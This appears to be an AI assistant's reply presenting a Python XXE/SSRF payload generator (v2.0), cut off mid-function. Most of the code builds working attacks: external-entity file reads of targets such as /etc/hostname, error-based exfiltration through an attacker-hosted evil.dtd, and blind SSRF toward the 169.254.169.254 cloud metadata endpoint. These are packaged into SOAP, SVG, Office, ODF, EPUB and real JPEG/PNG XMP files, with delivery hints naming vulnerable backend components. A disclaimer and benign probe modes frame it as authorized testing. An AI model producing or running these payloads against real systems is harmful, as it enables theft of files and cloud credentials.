好的，下面是基于上一轮分析优化后的完整版本。新增能力包括：

1. **新增格式**：ODF（odt/ods/odp）、EPUB、图片 XMP 注入（JPG/PNG）、Excel 2003 XML、XLIFF、PLIST、KML/GPX、Maven POM
2. **OOXML 多注入点**：`customXml`、`word/document.xml`、`docProps/core.xml`
3. **无害探测模式**（`--probe`）：DNS Canary / Parser Fingerprinting，不读取文件
4. **传输层封装**：multipart/form-data、SOAP MTOM 风格请求生成器
5. **组件投递指引**：每个 Payload 标注适合投递的后端组件
6. **修复验证模式**（`--verify-fix`）：生成一组探测包，全部无回连即说明修复生效

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XXE/SSRF Payload 生成与防御验证工具 v2.0
=========================================

相对 v1 的改进:
    [新增格式]
        - ODF (odt/ods/odp) 容器注入
        - EPUB 电子书注入
        - 图片 XMP 注入 (JPG / PNG 物理文件生成)
        - Excel 2003 XML Spreadsheet
        - XLIFF / PLIST / KML / GPX / Maven POM
    [深度增强]
        - OOXML 多注入点: customXml / document.xml / core.xml
        - 每个 Payload 标注 target_component 投递指引
    [防御视角]
        - --probe 模式: 无害 DNS Canary + Parser Fingerprinting
        - --verify-fix 模式: 修复效果验证套件
    [传输层]
        - multipart/form-data HTTP 请求生成
        - SOAP MTOM 风格附件封装
    [保留]
        - v1 全部场景: SOAP/SVG/Office/SAML/RSS/WebDAV/Spring
        - Local DTD Reuse / Error-Based / Blind SSRF / XInclude / Schema SSRF
        - DTD HTTP Server

安全说明:
    本工具仅用于授权安全测试、靶场环境、内部合规验证与防御修复确认。
    使用前请确保已获得目标系统的书面测试授权。
"""

import argparse
import base64
import json
import os
import struct
import textwrap
import time
import zipfile
import zlib
import uuid
from typing import Dict, List, Optional
from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
from urllib.parse import quote


VERSION = "2.0"

# ============================================================================
# 第一部分：本地 DTD 数据库
# ============================================================================

LOCAL_DTD_DATABASE: List[Dict] = [
    {
        "path": "file:///usr/share/yelp/dtd/docbookx.dtd",
        "entity_name": "ISOamso",
        "os": "linux",
        "platform": ["java", "dotnet"],
        "description": "GNOME Yelp DocBook DTD，Ubuntu/Fedora 常见",
        "confidence": "high"
    },
    {
        "path": "file:///usr/share/xml/fontconfig/fonts.dtd",
        "entity_name": "expr",
        "os": "linux",
        "platform": ["java", "dotnet"],
        "description": "Fontconfig 字体配置 DTD",
        "confidence": "medium"
    },
    {
        "path": "file:///usr/share/sgml/docbook/xml-dtd-4.1.2/docbookx.dtd",
        "entity_name": "ISOamso",
        "os": "linux",
        "platform": ["java", "dotnet"],
        "description": "DocBook XML DTD，RHEL/CentOS 常见",
        "confidence": "medium"
    },
    {
        "path": "jar:file:///usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd",
        "entity_name": "URI",
        "os": "linux",
        "platform": ["java"],
        "description": "Tomcat JSP API DTD，Docker Tomcat 常见",
        "confidence": "high"
    },
    {
        "path": "file:///C:/Windows/System32/wbem/xml/cim20.dtd",
        "entity_name": "CIMName",
        "os": "windows",
        "platform": ["java", "dotnet"],
        "description": "Windows WMI CIM DTD",
        "confidence": "high"
    },
]


# ============================================================================
# 第二部分：辅助函数
# ============================================================================

def normalize_file_uri(target_file: str) -> str:
    if target_file.startswith("file://"):
        return target_file
    normalized = target_file.replace("\\", "/")
    if len(normalized) >= 2 and normalized[1] == ":":
        return f"file:///{normalized}"
    if normalized.startswith("/"):
        return f"file://{normalized}"
    return f"file:///{normalized}"


def safe_filename(name: str) -> str:
    allowed = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-"
    return "".join(c if c in allowed else "_" for c in name)


def now_string() -> str:
    return time.strftime("%Y-%m-%d %H:%M:%S")


def ensure_dir(path: str):
    os.makedirs(path, exist_ok=True)


def extract_host(url: str) -> str:
    return url.replace("http://", "").replace("https://", "").strip("/").split("/")[0]


# ============================================================================
# 第三部分：二进制载体构造器 (XMP 图片注入)
# ============================================================================

class BinaryCarrierBuilder:
    """
    构造带 XMP (RDF/XML) 元数据的真实图片文件。
    用于测试: 图片元数据提取服务 / EXIF 解析链 / ImageMagick delegate。
    """

    @staticmethod
    def build_xmp_packet(inner_rdf: str) -> bytes:
        header = b'<?xpacket begin="\xef\xbb\xbf" id="W5M0MpCehiHzreSzNTczkc9d"?>\n'
        footer = b'\n<?xpacket end="w"?>'
        return header + inner_rdf.encode("utf-8") + footer

    @staticmethod
    def make_jpeg_with_xmp(xmp_packet: bytes) -> bytes:
        """
        生成最小合法 JPEG (1x1) 并在 SOI 之后插入 APP1 XMP 段。
        XMP APP1 标识: "http://ns.adobe.com/xap/1.0/\\x00"
        """
        # 最小 1x1 白底 JPEG
        minimal_jpeg = bytes.fromhex(
            "ffd8ffe000104a46494600010100000100010000"
            "ffdb0043000302020302020303030304030304050805050404050a07070608"
            "0c0a0c0c0b0a0b0b0d0e12100d0e110e0b0b1016101113141515150c0f171816141812141514"
            "ffc0000b080001000101011100"
            "ffc4001400010000000000000000000000000000000000000008"
            "ffc4001410010000000000000000000000000000000000000000"
            "ffda0008010100003f00d2cf20ffd9"
        )
        xmp_ns = b"http://ns.adobe.com/xap/1.0/\x00"
        app1_payload = xmp_ns + xmp_packet
        app1_len = len(app1_payload) + 2
        if app1_len > 0xFFFF:
            raise ValueError("XMP packet too large for JPEG APP1")
        app1_segment = b"\xff\xe1" + struct.pack(">H", app1_len) + app1_payload
        # 在 SOI (ffd8) 之后插入 APP1
        return minimal_jpeg[:2] + app1_segment + minimal_jpeg[2:]

    @staticmethod
    def make_png_with_xmp(xmp_packet: bytes) -> bytes:
        """
        生成最小合法 PNG (1x1) 并插入 iTXt chunk (XML:com.adobe.xmp)。
        """
        def chunk(chunk_type: bytes, data: bytes) -> bytes:
            c = chunk_type + data
            return struct.pack(">I", len(data)) + c + struct.pack(">I", zlib.crc32(c) & 0xffffffff)

        signature = b"\x89PNG\r\n\x1a\n"
        ihdr = chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
        # 1x1 RGB 像素 (filter byte + 3 bytes)
        raw = b"\x00\xff\xff\xff"
        idat = chunk(b"IDAT", zlib.compress(raw))
        # iTXt: keyword\0 compression_flag\0 compression_method\0 language\0 translated\0 text
        itxt_data = (
            b"XML:com.adobe.xmp\x00"   # keyword
            b"\x00"                     # compression flag = 0
            b"\x00"                     # compression method
            b"\x00"                     # language tag (empty)
            b"\x00"                     # translated keyword (empty)
            + xmp_packet
        )
        itxt = chunk(b"iTXt", itxt_data)
        iend = chunk(b"IEND", b"")
        return signature + ihdr + itxt + idat + iend


# ============================================================================
# 第四部分：核心 Payload 生成器
# ============================================================================

class XXEPayloadGenerator:
    """
    XXE Payload 生成器 v2。

    benign 模式说明:
        benign=True 时, 所有 file:// 读取与 SSRF URL 替换为
        指向 attacker_url 的无害 canary 子域名请求,
        用于修复验证与解析器指纹识别, 不产生任何数据外带。
    """

    def __init__(
        self,
        target_file: str = "/etc/hostname",
        attacker_url: str = "http://attacker.com",
        ssrf_url: str = "http://169.254.169.254/latest/meta-data/",
        target_os: str = "linux",
        platform: str = "java",
        benign: bool = False,
    ):
        self.target_file = target_file
        self.target_file_uri = normalize_file_uri(target_file)
        self.attacker_url = attacker_url.rstrip("/")
        self.attacker_host = extract_host(attacker_url)
        self.ssrf_url = ssrf_url
        self.target_os = target_os
        self.platform = platform
        self.benign = benign
        self.run_id = uuid.uuid4().hex[:8]

    # ------------------------------------------------------------------
    # 内部: 根据 benign 模式返回有效 URI
    # ------------------------------------------------------------------

    def _read_uri(self, tag: str) -> str:
        """benign 模式下不读文件, 改为 canary 请求。"""
        if self.benign:
            return f"http://{tag}-file-{self.run_id}.{self.attacker_host}/canary"
        return self.target_file_uri

    def _ssrf_uri(self, tag: str) -> str:
        """benign 模式下不打内网/元数据, 改为 canary 请求。"""
        if self.benign:
            return f"http://{tag}-ssrf-{self.run_id}.{self.attacker_host}/canary"
        return self.ssrf_url

    @staticmethod
    def _attach_component(payload: Dict, components: List[str], note: str = ""):
        payload["target_component"] = components
        if note:
            payload["delivery_note"] = note
        return payload

    # ------------------------------------------------------------------
    # 基础 XXE
    # ------------------------------------------------------------------

    def generate_basic_file_entity_payload(self) -> Dict:
        uri = self._read_uri("basic")
        p = {
            "name": "basic_file_entity" + ("_probe" if self.benign else ""),
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "{uri}">
]>
<root>&xxe;</root>''',
            "technique": "Basic External General Entity",
            "description": "基础外部通用实体测试。" + ("[PROBE] 无害 canary 版本。" if self.benign else ""),
            "requirements": ["解析器允许 DOCTYPE", "允许外部通用实体", "应用回显实体内容"],
            "file_ext": ".xml",
            "severity_if_vulnerable": "high",
        }
        return self._attach_component(p, ["任意 XML 接口", "上传后文本抽取服务"])

    def generate_local_dtd_payload(self, dtd_entry: Optional[Dict] = None) -> List[Dict]:
        payloads = []
        if self.benign:
            return []  # Local DTD Reuse 无无害等价物, probe 模式跳过

        candidates = [dtd_entry] if dtd_entry else [
            d for d in LOCAL_DTD_DATABASE
            if d["os"] == self.target_os and self.platform in d["platform"] and d.get("entity_name")
        ]

        for dtd in candidates:
            malicious_entity_value = (
                "\n"
                f'    <!ENTITY &#x25; xxe_file SYSTEM "{self.target_file_uri}">\n'
                f'    <!ENTITY &#x25; xxe_eval "<!ENTITY &#x26;#x25; xxe_error SYSTEM '
                f'&#x27;file:///nonexistent_xxe_path/&#x25;xxe_file;&#x27;>">\n'
                f"    &#x25;xxe_eval;\n"
                f"    &#x25;xxe_error;\n"
                f"  "
            )
            payloads.append(self._attach_component({
                "name": f"local_dtd_reuse_{dtd['entity_name']}",
                "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "{dtd["path"]}">
  <!ENTITY % {dtd["entity_name"]} '{malicious_entity_value}'>
  %local_dtd;
]>
<foo>local_dtd_reuse_test</foo>''',
                "technique": "Local DTD Reuse",
                "description": dtd["description"],
                "confidence": dtd["confidence"],
                "dtd_path": dtd["path"],
                "requirements": ["目标存在对应本地 DTD", "允许 file:// DTD", "回显 XML 解析错误"],
                "file_ext": ".xml",
                "severity_if_vulnerable": "high",
            }, ["出网受限环境下的 Java/.NET XML 端点"]))
        return payloads

    def generate_error_based_payload(self) -> Dict:
        p = {
            "name": "error_based_external_dtd",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{self.attacker_url}/evil.dtd">
  %xxe;
]>
<foo>error_based_xxe_test</foo>''',
            "evil_dtd": self._generate_evil_dtd(),
            "technique": "Error-Based XXE via External DTD",
            "description": "通过远程 DTD 构造错误路径，依赖错误信息泄露。",
            "requirements": ["目标可访问攻击者 DTD 服务器", "允许外部 DTD", "回显解析错误"],
            "file_ext": ".xml",
            "severity_if_vulnerable": "high",
        }
        return self._attach_component(p, ["可出网的 XML 端点", "错误信息未收敛的应用"])

    def _generate_evil_dtd(self) -> str:
        uri = self._read_uri("errdtd")
        return (
            f'<!ENTITY % file SYSTEM "{uri}">\n'
            f'<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
            f'\'file:///nonexistent_xxe_error/&#x25;file;\'>">\n'
            f'%eval;\n'
            f'%error;\n'
        )

    def generate_blind_ssrf_payload(self) -> List[Dict]:
        payloads = []
        p_uri = self._ssrf_uri("param")
        g_uri = self._ssrf_uri("general")
        d_uri = self._ssrf_uri("doctype")

        payloads.append({
            "name": "blind_ssrf_parameter_entity",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % ssrf SYSTEM "{p_uri}">
  %ssrf;
]>
<foo>blind_ssrf_parameter_entity</foo>''',
            "technique": "Blind SSRF via Parameter Entity",
            "file_ext": ".xml",
        })
        payloads.append({
            "name": "blind_ssrf_general_entity",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "{g_uri}">
]>
<foo>&ssrf;</foo>''',
            "technique": "Blind SSRF via General Entity",
            "file_ext": ".xml",
        })
        payloads.append({
            "name": "blind_ssrf_doctype_system",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "{d_uri}">
<foo>blind_ssrf_doctype_system</foo>''',
            "technique": "Blind SSRF via DOCTYPE SYSTEM",
            "file_ext": ".xml",
        })
        payloads.append({
            "name": "blind_ssrf_dns_canary",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dns_probe SYSTEM "http://xxe-dns-{self.run_id}.{self.attacker_host}/probe">
  %dns_probe;
]>
<foo>dns_canary</foo>''',
            "technique": "DNS Canary",
            "description": "纯 DNS 探测, 配合 DNS 日志平台确认解析器外联能力。天然无害。",
            "file_ext": ".xml",
            "severity_if_vulnerable": "info->high(证明外联面存在)",
        })

        for p in payloads:
            p.setdefault("description", "Blind SSRF 测试。")
            p["requirements"] = ["解析器允许 DTD", "允许访问外部 URL"]
            self._attach_component(p, ["无回显 XML 端点", "异步文档处理消费者"])
        return payloads

    def generate_xinclude_payload(self) -> List[Dict]:
        f_uri = self._read_uri("xinc")
        s_uri = self._ssrf_uri("xinc")
        payloads = [
            {
                "name": "xinclude_file_read",
                "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="{f_uri}"/>
</foo>''',
                "injection_fragment": (
                    f'<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" '
                    f'parse="text" href="{f_uri}"/>'
                ),
                "technique": "XInclude File Read",
                "description": "不依赖 DOCTYPE, 可注入到应用自有 XML 模板中。",
                "file_ext": ".xml",
            },
            {
                "name": "xinclude_ssrf",
                "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="{s_uri}"/>
</foo>''',
                "injection_fragment": (
                    f'<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" '
                    f'parse="text" href="{s_uri}"/>'
                ),
                "technique": "XInclude SSRF",
                "file_ext": ".xml",
            },
        ]
        for p in payloads:
            p.setdefault("description", "XInclude 测试。")
            p["requirements"] = ["启用 XInclude", "Java 需 setXIncludeAware(true)"]
            self._attach_component(p, ["禁用了 DOCTYPE 但忘记关 XInclude 的端点"])
        return payloads

    def generate_schema_ssrf_payload(self) -> List[Dict]:
        s_uri = self._ssrf_uri("schema")
        payloads = [
            {
                "name": "schema_ssrf_no_namespace",
                "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<foo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
     xsi:noNamespaceSchemaLocation="{s_uri}">
  schema_ssrf_no_namespace
</foo>''',
                "technique": "Schema Location SSRF",
                "file_ext": ".xml",
            },
            {
                "name": "schema_ssrf_with_namespace",
                "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<foo xmlns="http://example.com/test"
     xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
     xsi:schemaLocation="http://example.com/test {s_uri}">
  schema_ssrf_with_namespace
</foo>''',
                "technique": "Schema Location SSRF",
                "file_ext": ".xml",
            },
        ]
        for p in payloads:
            p["description"] = "通过 XSD 加载触发 SSRF。"
            p["requirements"] = ["启用 Schema 验证", "允许远程加载 XSD"]
            self._attach_component(p, ["启用 XSD 校验的接口", "Spring 配置加载器"])
        return payloads

    # ------------------------------------------------------------------
    # SOAP
    # ------------------------------------------------------------------

    def generate_soap_payloads(self) -> List[Dict]:
        payloads = []
        f_uri = self._read_uri("soap")
        s_uri = self._ssrf_uri("soap")

        payloads.append(self._attach_component({
            "name": "soap11_xxe_file_entity",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soapenv:Envelope [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header/>
  <soapenv:Body>
    <m:getInfo xmlns:m="http://example.com/soap">
      <m:value>&xxe;</m:value>
    </m:getInfo>
  </soapenv:Body>
</soapenv:Envelope>''',
            "technique": "SOAP 1.1 XXE",
            "content_type": "text/xml; charset=utf-8",
            "headers": {"Content-Type": "text/xml; charset=utf-8", "SOAPAction": "\"getInfo\""},
            "file_ext": ".xml",
            "requirements": ["SOAP 服务端解析 XML", "允许 DOCTYPE/外部实体"],
        }, ["JAX-WS / Axis / CXF 老旧 SOAP 服务"]))

        payloads.append(self._attach_component({
            "name": "soap12_xxe_file_entity",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE env:Envelope [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope">
  <env:Header/>
  <env:Body>
    <m:getInfo xmlns:m="http://example.com/soap12">
      <m:value>&xxe;</m:value>
    </m:getInfo>
  </env:Body>
</env:Envelope>''',
            "technique": "SOAP 1.2 XXE",
            "content_type": "application/soap+xml; charset=utf-8",
            "headers": {"Content-Type": "application/soap+xml; charset=utf-8"},
            "file_ext": ".xml",
            "requirements": ["SOAP 1.2 服务端解析 XML", "允许 DOCTYPE/外部实体"],
        }, ["现代 SOAP 1.2 服务"]))

        payloads.append(self._attach_component({
            "name": "soap_body_xinclude_file_read",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:xi="http://www.w3.org/2001/XInclude">
  <soapenv:Header/>
  <soapenv:Body>
    <m:getInfo xmlns:m="http://example.com/soap">
      <m:value>
        <xi:include parse="text" href="{f_uri}"/>
      </m:value>
    </m:getInfo>
  </soapenv:Body>
</soapenv:Envelope>''',
            "technique": "SOAP Body XInclude",
            "content_type": "text/xml; charset=utf-8",
            "file_ext": ".xml",
            "requirements": ["服务端启用 XInclude"],
        }, ["禁 DOCTYPE 但未禁 XInclude 的 SOAP 服务"]))

        payloads.append(self._attach_component({
            "name": "soap_schema_location_ssrf",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                  xsi:schemaLocation="http://schemas.xmlsoap.org/soap/envelope/ {s_uri}">
  <soapenv:Header/>
  <soapenv:Body>
    <test>schema_location_ssrf</test>
  </soapenv:Body>
</soapenv:Envelope>''',
            "technique": "SOAP SchemaLocation SSRF",
            "content_type": "text/xml; charset=utf-8",
            "file_ext": ".xml",
            "requirements": ["启用 Schema 验证", "允许远程 XSD"],
        }, ["开启 WS-Security/Schema 校验的 SOAP 网关"]))

        return payloads

    # ------------------------------------------------------------------
    # SVG
    # ------------------------------------------------------------------

    def generate_svg_payloads(self) -> List[Dict]:
        f_uri = self._read_uri("svg")
        s_uri = self._ssrf_uri("svg")
        comp = ["SVG 转 PNG/JPEG 缩略图服务", "HTML->PDF 渲染器", "ImageMagick/librsvg 链"]

        return [
            self._attach_component({
                "name": "svg_xxe_text_file_entity",
                "payload": f'''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<svg width="600" height="160" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="40" font-size="16">&xxe;</text>
</svg>''',
                "technique": "SVG XXE",
                "content_type": "image/svg+xml",
                "file_ext": ".svg",
                "requirements": ["服务端按 XML 解析 SVG", "允许 DOCTYPE/实体", "渲染结果回显文本"],
            }, comp),
            self._attach_component({
                "name": "svg_external_image_ssrf",
                "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<svg width="600" height="160" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <image x="10" y="10" width="100" height="100" xlink:href="{s_uri}"/>
  <text x="10" y="140">svg external resource ssrf test</text>
</svg>''',
                "technique": "SVG External Resource SSRF",
                "description": "非 XXE 但同链路: 渲染器加载外部资源, 常与 XXE 面并存。",
                "content_type": "image/svg+xml",
                "file_ext": ".svg",
                "requirements": ["渲染器加载外部资源", "网络未限制"],
            }, comp),
            self._attach_component({
                "name": "svg_xinclude_file_read",
                "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<svg width="600" height="160"
     xmlns="http://www.w3.org/2000/svg"
     xmlns:xi="http://www.w3.org/2001/XInclude">
  <text x="10" y="40">Before</text>
  <xi:include parse="text" href="{f_uri}"/>
  <text x="10" y="80">After</text>
</svg>''',
                "technique": "SVG XInclude",
                "content_type": "image/svg+xml",
                "file_ext": ".svg",
                "requirements": ["SVG 解析器启用 XInclude"],
            }, comp),
        ]

    # ------------------------------------------------------------------
    # Office OOXML —— 多注入点
    # ------------------------------------------------------------------

    def generate_office_payloads(self) -> List[Dict]:
        f_uri = self._read_uri("office")
        s_uri = self._ssrf_uri("office")
        comp = ["Office 在线预览", "LibreOffice/OnlyOffice headless 转换",
                "POI/docx4j 文本抽取", "DLP/杀毒网关文档解析"]

        # 注入点 A: customXml (数据绑定场景)
        custom_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<root><value>&xxe;</value></root>'''

        # 注入点 B: document.xml 正文 (预览/渲染场景)
        doc_body = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE w:document [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>'''

        # 注入点 C: core.xml 属性 (元数据抽取场景)
        core_props = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cp:coreProperties [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<cp:coreProperties
    xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
    xmlns:dc="http://purl.org/dc/elements/1.1/">
  <dc:title>&xxe;</dc:title>
</cp:coreProperties>'''

        blind_custom = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % ssrf SYSTEM "{s_uri}">
  %ssrf;
]>
<root>office_ooxml_ssrf</root>'''

        results = []
        for kind in ("docx", "xlsx", "pptx"):
            results.append(self._attach_component({
                "name": f"office_{kind}_customxml_xxe",
                "payload": custom_xml,
                "technique": "OOXML customXml XXE",
                "injection_point": "customXml/item1.xml",
                "file_ext": f".{kind}",
                "ooxml_kind": kind,
                "ooxml_injection": "customxml",
                "requirements": ["解析 customXml 部件", "内部解析器允许实体"],
            }, comp))

        results.append(self._attach_component({
            "name": "office_docx_document_body_xxe",
            "payload": doc_body,
            "technique": "OOXML document.xml XXE",
            "injection_point": "word/document.xml",
            "description": "正文注入, 预览渲染即触发, 比 customXml 路径更容易命中。",
            "file_ext": ".docx",
            "ooxml_kind": "docx",
            "ooxml_injection": "document",
            "requirements": ["解析 word/document.xml", "允许实体"],
        }, comp))

        results.append(self._attach_component({
            "name": "office_docx_coreprops_xxe",
            "payload": core_props,
            "technique": "OOXML core.xml XXE",
            "injection_point": "docProps/core.xml",
            "description": "属性注入, 命中文档元数据抽取/搜索索引类组件。",
            "file_ext": ".docx",
            "ooxml_kind": "docx",
            "ooxml_injection": "coreprops",
            "requirements": ["抽取文档属性", "允许实体"],
        }, comp))

        results.append(self._attach_component({
            "name": "office_docx_customxml_blind_ssrf",
            "payload": blind_custom,
            "technique": "OOXML customXml Blind SSRF",
            "injection_point": "customXml/item1.xml",
            "file_ext": ".docx",
            "ooxml_kind": "docx",
            "ooxml_injection": "customxml",
            "requirements": ["解析 customXml", "允许参数实体外联"],
        }, comp))

        return results

    # ------------------------------------------------------------------
    # ODF (新增)
    # ------------------------------------------------------------------

    def generate_odf_payloads(self) -> List[Dict]:
        """
        ODF: odt/ods/odp。ZIP + content.xml/meta.xml。
        主要命中 LibreOffice/OpenOffice 转换链。
        """
        f_uri = self._read_uri("odf")
        comp = ["LibreOffice/OpenOffice headless", "ODF 文本抽取服务", "在线文档预览"]

        content_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE office:document-content [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<office:document-content
    xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
    xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
    office:version="1.2">
  <office:body>
    <office:text>
      <text:p>&xxe;</text:p>
    </office:text>
  </office:body>
</office:document-content>'''

        meta_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE office:document-meta [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<office:document-meta
    xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
    xmlns:dc="http://purl.org/dc/elements/1.1/"
    office:version="1.2">
  <office:meta>
    <dc:title>&xxe;</dc:title>
  </office:meta>
</office:document-meta>'''

        results = []
        for kind, mimetype in (
            ("odt", "application/vnd.oasis.opendocument.text"),
            ("ods", "application/vnd.oasis.opendocument.spreadsheet"),
            ("odp", "application/vnd.oasis.opendocument.presentation"),
        ):
            results.append(self._attach_component({
                "name": f"odf_{kind}_content_xxe",
                "payload": content_xml,
                "technique": "ODF content.xml XXE",
                "injection_point": "content.xml",
                "file_ext": f".{kind}",
                "odf_kind": kind,
                "odf_mimetype": mimetype,
                "odf_injection": "content",
                "requirements": ["服务端解析 ODF content.xml", "允许实体"],
            }, comp))

        results.append(self._attach_component({
            "name": "odf_odt_meta_xxe",
            "payload": meta_xml,
            "technique": "ODF meta.xml XXE",
            "injection_point": "meta.xml",
            "file_ext": ".odt",
            "odf_kind": "odt",
            "odf_mimetype": "application/vnd.oasis.opendocument.text",
            "odf_injection": "meta",
            "requirements": ["抽取 ODF 元数据", "允许实体"],
        }, comp))

        return results

    # ------------------------------------------------------------------
    # EPUB (新增)
    # ------------------------------------------------------------------

    def generate_epub_payloads(self) -> List[Dict]:
        f_uri = self._read_uri("epub")
        comp = ["电子书上传/在线阅读平台", "EPUB->PDF 转换服务", "内容索引服务"]

        opf = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE package [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="bid">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="bid">urn:xxe:epub</dc:identifier>
    <dc:title>&xxe;</dc:title>
    <dc:language>en</dc:language>
  </metadata>
  <manifest>
    <item id="c1" href="chapter1.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="c1"/></spine>
</package>'''

        return [self._attach_component({
            "name": "epub_opf_xxe",
            "payload": opf,
            "technique": "EPUB OPF XXE",
            "injection_point": "OEBPS/content.opf",
            "file_ext": ".epub",
            "epub": True,
            "requirements": ["解析 OPF 包描述", "允许实体"],
        }, comp)]

    # ------------------------------------------------------------------
    # 图片 XMP (新增)
    # ------------------------------------------------------------------

    def generate_xmp_image_payloads(self) -> List[Dict]:
        """
        JPG/PNG 中嵌入 XMP RDF/XML。
        命中: 元数据提取、ExifTool 链、ImageMagick identify、云图床审核。
        """
        f_uri = self._read_uri("xmp")
        s_uri = self._ssrf_uri("xmp")
        comp = ["图片元数据提取服务", "ImageMagick identify/convert",
                "ExifTool 调用链", "图床内容审核/DLP"]

        rdf_xxe = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rdf:RDF [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
         xmlns:dc="http://purl.org/dc/elements/1.1/">
  <rdf:Description rdf:about="">
    <dc:title>&xxe;</dc:title>
  </rdf:Description>
</rdf:RDF>'''

        rdf_ssrf = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rdf:RDF [
  <!ENTITY % ssrf SYSTEM "{s_uri}">
  %ssrf;
]>
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
  <rdf:Description rdf:about=""/>
</rdf:RDF>'''

        return [
            self._attach_component({
                "name": "jpg_xmp_xxe",
                "payload": rdf_xxe,
                "technique": "JPEG XMP XXE",
                "injection_point": "APP1 XMP segment",
                "file_ext": ".jpg",
                "binary_carrier": "jpg",
                "requirements": ["提取 XMP 且解析器允许实体"],
            }, comp),
            self._attach_component({
                "name": "png_xmp_xxe",
                "payload": rdf_xxe,
                "technique": "PNG XMP XXE",
                "injection_point": "iTXt chunk (XML:com.adobe.xmp)",
                "file_ext": ".png",
                "binary_carrier": "png",
                "requirements": ["提取 XMP 且解析器允许实体"],
            }, comp),
            self._attach_component({
                "name": "jpg_xmp_blind_ssrf",
                "payload": rdf_ssrf,
                "technique": "JPEG XMP Blind SSRF",
                "injection_point": "APP1 XMP segment",
                "file_ext": ".jpg",
                "binary_carrier": "jpg",
                "requirements": ["提取 XMP 且允许外联"],
            }, comp),
        ]

    # ------------------------------------------------------------------
    # 其他纯 XML 业务格式 (新增)
    # ------------------------------------------------------------------

    def generate_misc_xml_payloads(self) -> List[Dict]:
        f_uri = self._read_uri("misc")
        s_uri = self._ssrf_uri("misc")
        results = []

        # Excel 2003 XML Spreadsheet —— 单文件 XML, 常被误当普通 xml
        results.append(self._attach_component({
